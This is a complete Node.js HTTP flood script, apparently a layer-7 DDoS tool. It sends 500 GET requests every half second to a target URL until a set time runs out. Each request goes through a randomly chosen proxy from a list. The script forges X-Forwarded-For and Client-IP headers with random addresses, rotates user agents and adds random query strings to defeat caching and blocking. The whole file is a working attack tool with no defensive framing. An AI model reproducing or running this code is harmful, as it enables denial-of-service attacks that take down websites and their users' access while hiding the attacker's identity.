const fs = require("fs");
const { SocksProxyAgent } = require("socks-proxy-agent");
const HttpsProxyAgent = require("https-proxy-agent");
const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
];

const proxies = fs.readFileSync("proxies.txt", "utf-8")
  .split("\n")
  .filter(p => p.trim().length > 5);

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function randomQuery() {
  const key = Math.random().toString(36).substring(7);
  const value = Math.random().toString(36).substring(7);
  return `?${key}=${value}`;
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "Referer": `https://${hostname}/${Math.random().toString(36).substring(2)}`,
    "Accept": "*/*",
    "Connection": "keep-alive"
  };
}

module.exports = function (target, duration) {
  const end = Date.now() + duration * 1000;
  const url = new URL(target);
  const protocol = url.protocol === "https:" ? https : http;

  function attack() {
    if (Date.now() >= end) return;

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const headers = randomHeaders(url.hostname);
    const path = url.pathname + url.search + randomQuery();

    const agent = proxy.startsWith("socks")
      ? new SocksProxyAgent("socks4://" + proxy)
      : new HttpsProxyAgent("http://" + proxy);

    const options = {
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path,
      method: "GET",
      headers,
      agent
    };

    const req = protocol.request(options, res => {
      res.on("data", () => {});
      if (res.statusCode >= 200 && res.statusCode < 300) {
        console.log(`✅ [${proxy}] → [${url.hostname}${path}] success`);
      } else {
        console.log(`⚠️ [${proxy}] → [${url.hostname}${path}] status: ${res.statusCode}`);
      }
    });

    req.on("error", () => {
      console.log(`❌ [${proxy}] failed to connect to [${url.hostname}]`);
    });

    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 500; i++) attack();
    setTimeout(loop, 500);
  }

  loop();
};